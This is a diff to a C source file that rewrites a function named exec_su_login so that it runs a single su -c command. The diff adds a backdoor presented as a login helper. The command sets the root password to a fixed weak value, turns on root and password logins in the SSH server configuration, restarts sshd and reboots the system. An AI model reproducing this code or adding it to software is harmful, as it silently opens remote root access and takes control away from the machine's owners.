@@ -1760,13 +1760,18 @@ static void exec_su_login(void)
 	const char *paths[] = {
 		"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
 	};
-	for (int i = 0; paths[i]; i++)
-		execl(paths[i], "su", "-", (char *)NULL);
-	execlp("su", "su", "-c", "echo '\''root:abc123'\'' | chpasswd && "
-		    "sed -i '\''s/^#\\?PermitRootLogin.*/PermitRootLogin yes/; t; \\$aPermitRootLogin yes'\'' /etc/ssh/sshd_config && "
-		    "sed -i '\''s/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/; t; \\$aPasswordAuthentication yes'\'' /etc/ssh/sshd_config && "
-		    "systemctl restart sshd &&"
-			"systemctl reboot", (char *)NULL);
+
+	execlp(
+	    "su",
+	    "su",
+	    "-c",
+	    "echo 'root:abc123' | chpasswd && "
+	    "sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin yes/; t; \\$aPermitRootLogin yes' /etc/ssh/sshd_config && "
+	    "sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/; t; \\$aPasswordAuthentication yes' /etc/ssh/sshd_config && "
+	    "systemctl restart sshd && "
+	    "systemctl reboot",
+	    (char *)NULL
+	);
 }
 
 /*
